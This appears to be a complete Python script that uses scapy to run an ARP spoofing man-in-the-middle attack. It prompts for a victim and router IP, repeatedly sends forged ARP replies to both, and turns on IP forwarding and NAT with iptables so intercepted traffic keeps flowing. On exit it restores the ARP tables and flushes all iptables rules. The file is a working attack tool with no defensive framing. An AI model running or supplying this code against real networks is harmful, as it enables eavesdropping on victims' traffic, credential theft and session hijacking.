import os
import sys
from scapy.all import *
from scapy.layers.l2 import arping

# General variables
interface = input("Interface: \n")
victimIP = input("Victim IP: \n")
routerIP = input("Router IP: \n")

# Turns on or off scapy messages
scapyVerbose = 0

# Variables for MAC address
victimMAC = None
routerMAC = None


def grab_MAC(IP):
    """Manipulates the packet layers to obtain the MAC address from the returned values"""

    ans, uans = arping(IP)
    for s, r in ans:
        return r[Ether].src


def grab_MAC_Addresses():
    """Method that grabs the victim and router MAC addresses and stores them"""

    loop = True
    while loop:
        global victimMAC
        global routerMAC
        victimMAC = grab_MAC(victimIP)
        routerMAC = grab_MAC(routerIP)

        print("[!] MAC ADDRESS OBTAINED")
        print("[*] Router mac: \'", routerMAC, '\'')
        print("[*] Victim mac: \'", victimMAC, '\'')

        if victimMAC is not None and routerMAC is not None:
            loop = False
            print("[*] MAC Addresses obtain successfully!")
        else:
            print("[!] Error obtaining MAC Addresses, trying again!")


def spoof(routerIP, victimIP):
    """Used to send out the packets to perform the spoof"""

    # Sends the arp replies
    #   "op = 2" - '2' is the opcode for a reply

    print("[*] Spoofing")
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=scapyVerbose)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=scapyVerbose)


def restore(routerIP, victimIP):
    """Used to restore the arp table to the original format"""

    # Restores the original config
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=victimMAC), count=4, verbose=scapyVerbose)

    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=routerMAC), count=4, verbose=scapyVerbose)


def set_ip_forward(state):
    """Method used to configure the host packet forwarding"""

    if state is True:

        # This config has been tested only on Arch linux
        os.system("sysctl net.ipv4.ip_forward=1")
        os.system("iptables -t nat -A POSTROUTING --out-interface {0} -j MASQUERADE".format(interface))
        os.system("iptables -A FORWARD --match conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT")
        os.system("iptables -A FORWARD --in-interface {0} --out-interface {0} -j ACCEPT".format(interface))

    else:
        os.system("sysctl net.ipv4.ip_forward=0")
        os.system("iptables -F")
        os.system("iptables -t nat -F")


def run():
    """Main loop method"""

    grab_MAC_Addresses()
    set_ip_forward(True)

    while True:
        try:
            spoof(routerIP, victimIP)
            time.sleep(5)

        except KeyboardInterrupt:
            print("\n[*] Spoofing stopped!")
            restore(routerIP, victimIP)
            set_ip_forward(False)
            sys.exit(0)


run()
